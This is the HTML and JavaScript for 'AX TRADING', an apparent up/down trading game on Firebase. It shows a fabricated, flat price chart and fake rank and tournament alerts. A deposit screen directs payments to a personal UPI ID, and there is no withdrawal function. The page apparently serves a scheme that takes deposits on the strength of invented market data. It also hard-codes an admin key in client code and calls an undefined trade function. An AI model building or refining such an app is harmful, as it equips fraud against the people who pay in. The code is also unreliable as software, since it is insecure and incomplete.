<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AX TRADING | Professional Fix</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
    <style>
        :root { --bg: #0b1217; --card: #151d24; --up: #00c805; --down: #ff3b30; --text: #ffffff; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        
        .header { background: var(--card); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2c3e50; }
        .logo { font-weight: 900; color: var(--up); font-size: 22px; cursor: pointer; }
        .acc-switcher { background: #1c2630; padding: 5px 15px; border-radius: 8px; cursor: pointer; text-align: right; border: 1px solid #2c3e50; }

        /* Chart Area Fix */
        #chartWrapper { width: 100%; height: 50vh; background: #080d11; position: relative; }
        #chartContainer { width: 100%; height: 100%; }
        
        .trade-controls { background: var(--card); height: 40vh; padding: 20px; border-radius: 30px 30px 0 0; position: relative; z-index: 10; }
        .input-group { background: #1c2630; padding: 10px; border-radius: 12px; margin-bottom: 15px; text-align: center; }
        .input-group input { background: transparent; border: none; color: white; font-size: 22px; width: 80%; text-align: center; outline: none; }
        
        .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .btn { padding: 18px; border-radius: 15px; border: none; font-size: 18px; font-weight: 900; color: white; cursor: pointer; }
        .btn-up { background: var(--up); box-shadow: 0 4px 0 #008a03; }
        .btn-down { background: var(--down); box-shadow: 0 4px 0 #b32a22; }

        /* Notification & Modals */
        #notif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--down); padding: 15px 25px; border-radius: 10px; display: none; z-index: 9999; }
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:1000; align-items:center; justify-content:center; }
        .modal-content { background: var(--card); width: 85%; max-height: 85vh; overflow-y: auto; padding: 25px; border-radius: 20px; border: 1px solid #2c3e50; text-align: center; }
        
        .navbar { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #2c3e50; }
        .nav-link { font-size: 10px; color: #8a949d; text-align: center; cursor: pointer; }
        .qr-img { width: 220px; height: 220px; margin: 15px 0; border: 4px solid white; border-radius: 10px; }
    </style>
</head>
<body>

<div id="notif"></div>

<div class="header">
    <div class="logo" onclick="openAdmin()">AX TRADING</div>
    <div class="acc-switcher" onclick="openM('accM')">
        <small id="walletType">Live Account</small>
        <div id="userBal">₹0.00</div>
    </div>
</div>

<div id="chartWrapper"><div id="chartContainer"></div></div>

<div class="trade-controls">
    <div class="input-group">
        <small style="color:#8a949d">INVESTMENT (₹)</small><br>
        <input type="number" id="betAmt" value="100">
    </div>
    <div class="btn-row">
        <button class="btn btn-up" onclick="trade('UP')">UP ↑</button>
        <button class="btn btn-down" onclick="trade('DOWN')">DOWN ↓</button>
    </div>
</div>

<div class="navbar">
    <div class="nav-link" onclick="openM('profileM')">👤 Profile</div>
    <div class="nav-link" onclick="openM('depM')">💰 Deposit</div>
    <div class="nav-link" onclick="copyInvite()">👥 Invite</div>
    <div class="nav-link" onclick="showRank()">🏆 Rank</div>
    <div class="nav-link" onclick="showTourney()">🎯 Tourney</div>
</div>

<div id="adminM" class="modal"><div class="modal-content">
    <h3>Admin Control</h3>
    <div id="adminReqs">No pending requests</div>
    <button class="btn" style="width:100%; background:#333; margin-top:20px" onclick="closeM('adminM')">Close</button>
</div></div>

<div id="depM" class="modal"><div class="modal-content">
    <h3>Deposit Money</h3>
    <input type="number" id="depAmount" placeholder="Amount" oninput="showPay()">
    <div id="payArea" style="display:none;">
        <p>UPI ID: <b>alimp26082000-1@okaxis</b></p>
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=alimp26082000-1@okaxis" class="qr-img">
        <input type="text" id="utrCode" placeholder="Enter 12-digit UTR">
        <button class="btn btn-up" style="width:100%" onclick="submitDep()">Submit</button>
    </div>
    <button class="btn" style="width:100%; background:#333; margin-top:10px" onclick="closeM('depM')">Close</button>
</div></div>

<script>
    // Firebase Setup
    const firebaseConfig = { databaseURL: "https://my-colour-game-670af-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let uid = localStorage.getItem('AX_UID') || 'AX'+Math.floor(Math.random()*9999);
    localStorage.setItem('AX_UID', uid);

    // --- Chart Logic Fix ---
    const chart = LightweightCharts.createChart(document.getElementById('chartContainer'), {
        layout: { backgroundColor: '#080d11', textColor: '#d1d4dc' },
        grid: { vertLines: { color: '#1c2630' }, horzLines: { color: '#1c2630' } },
        timeScale: { timeVisible: true, secondsVisible: false },
        handleScroll: true, handleScale: true
    });
    const candleSeries = chart.addCandlestickSeries({
        upColor: '#00c805', downColor: '#ff3b30', borderVisible: false, wickVisible: true
    });

    // History (60 Candles)
    let candleData = [];
    let baseTime = Math.floor(Date.now() / 1000) - 3600;
    for(let i=0; i<60; i++) {
        candleData.push({ time: baseTime + (i*60), open: 113.4, high: 113.6, low: 113.2, close: 113.5 });
    }
    candleSeries.setData(candleData);

    // Live Updates
    setInterval(() => {
        let last = candleData[candleData.length - 1];
        let now = Math.floor(Date.now() / 1000);
        if(now >= last.time + 60) {
            let next = { time: last.time + 60, open: last.close, high: last.close+0.1, low: last.close-0.1, close: last.close };
            candleData.push(next);
            candleSeries.update(next);
        }
    }, 1000);

    // --- Interface Functions ---
    function openM(id) { document.getElementById(id).style.display='flex'; }
    function closeM(id) { document.getElementById(id).style.display='none'; }
    function showPay() { document.getElementById('payArea').style.display='block'; }
    
    function submitDep() {
        let amt = document.getElementById('depAmount').value;
        let utr = document.getElementById('utrCode').value;
        db.ref('admin/depositRequests/'+uid).set({ uid, amt, utr, status:'pending', time: Date.now() });
        alert("Submitted!"); closeM('depM');
    }

    // Rejection Notification
    db.ref('admin/depositRequests/'+uid).on('value', s => {
        let d = s.val();
        if(d && d.status === 'rejected') {
            const n = document.getElementById('notif');
            n.innerHTML = `⚠️ Rejected: ${d.reason || 'Invalid UTR'}`;
            n.style.display = 'block';
            setTimeout(() => n.style.display = 'none', 5000);
        }
    });

    // Admin Control
    function openAdmin() { 
        if(prompt("Admin Key:") === "77759636477") openM('adminM'); 
    }

    function showRank() { alert("Your Rank: #42"); }
    function showTourney() { alert("Tourney Starts in 2 Days!"); }

    db.ref('users/'+uid+'/balance').on('value', s => { 
        document.getElementById('userBal').innerText = "₹" + (s.val() || 0).toFixed(2); 
    });
</script>
</body>
</html>
